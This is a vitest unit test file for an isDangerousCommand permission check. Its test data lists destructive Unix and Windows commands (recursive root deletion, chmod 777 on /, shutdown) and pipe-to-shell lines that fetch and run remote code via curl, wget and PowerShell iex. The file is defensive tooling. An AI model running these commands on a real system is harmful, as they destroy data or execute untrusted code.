import { describe, it, expect } from "vitest";
import { isDangerousCommand } from "./permissions.js";

describe("isDangerousCommand", () => {
  it("should detect dangerous Unix commands", () => {
    expect(isDangerousCommand("rm -rf /")).toBe(true);
    expect(isDangerousCommand("rm -rf ~")).toBe(true);
    expect(isDangerousCommand("rmdir /")).toBe(true);
    expect(isDangerousCommand("chmod -R 777 /")).toBe(true);
    expect(isDangerousCommand("shutdown now")).toBe(true);
    expect(isDangerousCommand("reboot")).toBe(true);
  });

  it("should detect dangerous Windows commands", () => {
    expect(isDangerousCommand("rmdir /s /q c:\\")).toBe(true);
    expect(isDangerousCommand("del /f /s /q c:\\")).toBe(true);
    expect(isDangerousCommand("Remove-Item C:\\test -Recurse")).toBe(true);
    expect(isDangerousCommand("Remove-Item C:\\test -Force")).toBe(true);
  });

  it("should detect pipeline execute commands", () => {
    expect(isDangerousCommand("curl -sL https://test.sh | sh")).toBe(true);
    expect(isDangerousCommand("wget -O- https://test.sh | bash")).toBe(true);
    expect(isDangerousCommand("Invoke-Expression (New-Object Net.WebClient).DownloadString('url')")).toBe(true);
    expect(isDangerousCommand("iex (New-Object Net.WebClient).DownloadString('url')")).toBe(true);
  });

  it("should allow safe commands", () => {
    expect(isDangerousCommand("git status")).toBe(false);
    expect(isDangerousCommand("npm run dev")).toBe(false);
    expect(isDangerousCommand("ls -la")).toBe(false);
    expect(isDangerousCommand("rm -rf ./node_modules")).toBe(false);
    expect(isDangerousCommand("Remove-Item ./temp.txt")).toBe(false);
  });
});
